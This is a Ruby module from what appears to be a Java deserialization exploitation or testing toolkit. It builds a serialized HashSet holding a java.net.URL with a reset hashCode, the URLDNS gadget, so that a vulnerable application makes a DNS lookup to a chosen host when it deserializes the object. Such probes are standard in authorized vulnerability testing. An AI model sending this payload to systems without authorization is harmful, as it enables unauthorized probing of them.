
require_relative '../serialize'

module Java
  module Serialize
    module Payloads
      module URL
        def make_dns_lookup(host)
          url = JavaObject.new('Ljava/net/URL;', 'protocol' => 'http',
                                                 'host' => host,
                                                 'hashCode' => -1)
          JavaObject.new('Ljava/util/HashSet;', 'elements' => [url])
        end

        module_function :make_dns_lookup
        end
    end
  end
end
